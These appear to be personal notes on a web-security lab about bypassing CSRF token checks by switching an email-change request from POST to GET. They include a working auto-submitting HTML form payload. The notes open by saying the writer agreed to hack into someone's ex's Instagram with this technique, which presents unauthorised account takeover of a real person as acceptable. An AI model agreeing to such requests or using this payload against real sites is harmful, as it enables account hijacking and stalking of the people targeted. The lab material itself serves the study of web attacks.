# NOTES
Someone asked me to hack into their ex's Instagram. I told them sure thing I could use an X-Site-Request-Forgery. 

## LEARNINGS
- Forms : Can send out requests from any protocol. 
- CSRF Token Bypass : To bypass the validation, try switching protocols. Only works if the action works with the chosen protocol. 
  *e.g. change-email action worked with GET requests, the payload worked* 

### EXPLOIT 
- This challenge had CSRF token validation on the email change action 
- Changed the Protocol from "POST" to "GET" to bypass the validation

		404 : Not Found 
		 <html>
		  <body>
		    <form action="https://ac411f8c1e773784c006359900f000bb.web-security-academy.net/my-account/change-email" method="GET">
		      <input type="hidden" name="email" value="pwned@evil-user.net" />
		      <input type="hidden" name="csrf" value="3JX7u51QbzD66oQYbMpw9hLCxGM4q7Ee" />
		    </form>
		    <script>
		      document.forms[0].submit();
		    </script>
		  </body>
		</html> 

![[Pasted image 20220126054012.png]]
